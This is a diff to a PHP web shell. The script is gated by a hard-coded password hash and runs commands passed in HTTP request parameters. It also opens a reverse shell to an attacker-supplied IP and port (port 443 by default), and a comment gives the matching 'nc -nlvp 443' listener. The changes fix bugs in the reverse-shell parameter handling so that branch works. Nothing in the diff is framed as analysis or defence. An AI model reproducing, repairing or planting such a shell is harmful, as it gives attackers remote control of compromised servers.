@@ -10,7 +10,7 @@
 
 
 if (!isset($_REQUEST['pass'])) {
-	exit();
+  exit();
 }
 # Set you password here!
 if(($_REQUEST['pass'] != "e5bd68701aeec2072ecfd25885692620")) {
@@ -33,15 +33,15 @@ if(isset($_REQUEST[$cmd])) {
     $command = $_REQUEST[$cmd];
     executeCommand($command);
 
-} else if(isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
+} else if(isset($_REQUEST['ip']) && !isset($_REQUEST['cmd'])) {
 
-    $ip = $_REQUEST[$ip];
+    $ip = $_REQUEST['ip'];
 
     # default port 443
     $port = '443';
 
-    if(isset($_REQUEST[$ip])){
-        $port = $_REQUEST[$port];
+    if(isset($_REQUEST['ip'])){
+        $port = $_REQUEST['port'];
     }
 
     # nc -nlvp 443
